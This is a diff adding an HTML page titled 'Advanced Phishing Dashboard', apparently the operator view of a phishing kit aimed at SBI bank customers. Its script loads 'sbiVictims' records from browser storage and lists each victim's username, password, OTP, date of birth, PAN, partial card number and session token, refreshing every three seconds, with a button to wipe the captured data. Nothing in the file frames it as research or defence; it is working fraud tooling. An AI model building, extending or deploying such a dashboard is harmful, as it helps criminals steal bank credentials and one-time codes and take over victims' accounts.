@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Dashboard - Advanced</title>
+    <style>
+        body { background: #0b0e14; color: #e0e7ef; font-family: monospace; padding: 16px; }
+        h2 { color: #ff4d4d; }
+        .card { background: #1a1f2b; border-radius: 12px; padding: 16px; margin: 12px 0; border-left: 6px solid #ff4d4d; }
+        .label { color: #aaa; font-size: 12px; }
+        .value { font-size: 18px; font-weight: bold; word-break: break-all; margin: 4px 0 8px; }
+        button { background: #ff4d4d; color: white; border: none; padding: 12px 20px; border-radius: 30px; font-size: 16px; margin: 5px; }
+        .session-token { background: #0f172a; padding: 8px; border-radius: 6px; font-family: monospace; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h2>🕵️ Advanced Phishing Dashboard</h2>
+    <button onclick="loadData()">🔄 Refresh</button>
+    <button onclick="clearData()">🗑️ Clear</button>
+    <div id="dataContainer"></div>
+
+    <script>
+        function loadData() {
+            const data = localStorage.getItem('sbiVictims');
+            const container = document.getElementById('dataContainer');
+            if (!data) {
+                container.innerHTML = '<div class="card">No victims yet.</div>';
+                return;
+            }
+            const victims = JSON.parse(data);
+            let html = '';
+            victims.slice().reverse().forEach((v, i) => {
+                html += `<div class="card">
+                    <div class="label">👤 Username</div>
+                    <div class="value">${v.username || '—'}</div>
+                    <div class="label">🔐 Password</div>
+                    <div class="value">${v.password || '—'}</div>
+                    <div class="label">📱 OTP</div>
+                    <div class="value">${v.otp || '—'}</div>
+                    <div class="label">🎂 DOB</div>
+                    <div class="value">${v.dob || '—'}</div>
+                    <div class="label">🆔 PAN</div>
+                    <div class="value">${v.pan || '—'}</div>
+                    <div class="label">💳 Card Last 6</div>
+                    <div class="value">${v.cardDigits || '—'}</div>
+                    <div class="label">🔑 Session Token</div>
+                    <div class="session-token">${v.sessionToken || '—'}</div>
+                    <div class="label">🕒 ${v.timestamp || ''}</div>
+                </div>`;
+            });
+            container.innerHTML = html;
+        }
+        function clearData() {
+            if (confirm('Delete all captured data?')) {
+                localStorage.removeItem('sbiVictims');
+                loadData();
+            }
+        }
+        loadData();
+        setInterval(loadData, 3000);
+    </script>
+</body>
+</html>
